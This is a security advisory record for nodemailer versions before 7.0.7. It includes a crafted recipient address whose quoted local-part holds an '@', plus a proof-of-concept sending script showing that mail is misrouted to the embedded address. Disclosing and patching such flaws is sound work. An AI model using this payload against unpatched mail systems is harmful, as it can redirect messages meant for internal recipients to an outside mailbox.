---
identifier: "GHSA-mm7p-fcc7-pg87"
identifiers:
- "GHSA-mm7p-fcc7-pg87"
package_slug: "npm/nodemailer"
title: "Nodemailer: Email to an unintended domain can occur due to Interpretation
  Conflict"
description: "The email parsing library incorrectly handles quoted local-parts containing
  @. This leads to misrouting of email recipients, where the parser extracts and routes
  to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com
  x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer
  = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\nservice:
  \"gmail\",\nauth: {\nuser: \"\",\npass: \"\",\n},\n});\n\nlet mailOptions = {\nfrom:
  '\"Test Sender\" <your_email@gmail.com>',\nto: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\nsubject:
  \"Hello from Nodemailer\",\ntext: \"This is a test email sent using Gmail SMTP and
  Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\nif (error)
  {\nreturn console.log(\"Error: \", error);\n}\nconsole.log(\"Message sent: %s\",
  info.messageId);\n\n});\n\n\n(async () => {\nconst parser = await import(\"@sparser/email-address-parser\");\nconst
  { EmailAddress, ParsingOptions } = parser.default;\nconst parsed = EmailAddress.parse(mailOptions.to
  /*, new ParsingOptions(true) */);\n\nif (!parsed) {\nconsole.error(\"Invalid email
  address:\", mailOptions.to);\nreturn;\n}\n\nconsole.log(\"Parsed email:\", {\naddress:
  `${parsed.localPart}@${parsed.domain}`,\nlocal: parsed.localPart,\ndomain: parsed.domain,\n});\n})();\n```\n\nRunning
  the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email:
  {\naddress: '\"xclow3n@gmail.com x\"@internal.domain',\nlocal: '\"xclow3n@gmail.com
  x\"',\ndomain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img
  width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\"
  />"
date: "2025-10-07"
pubdate: "2025-10-07"
affected_range: "<7.0.7"
fixed_versions:
- "7.0.7"
affected_versions: "All versions before 7.0.7"
not_impacted: "All versions starting from 7.0.7"
solution: "Upgrade to version 7.0.7 or above."
urls:
- "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
- "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87"
- "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626"
- "https://github.com/nodemailer/nodemailer"
uuid: "7f706395-4f0b-4838-b372-0691c6aa0313"
cwe_ids:
- "CWE-20"
- "CWE-436"
- "CWE-937"
- "CWE-1035"
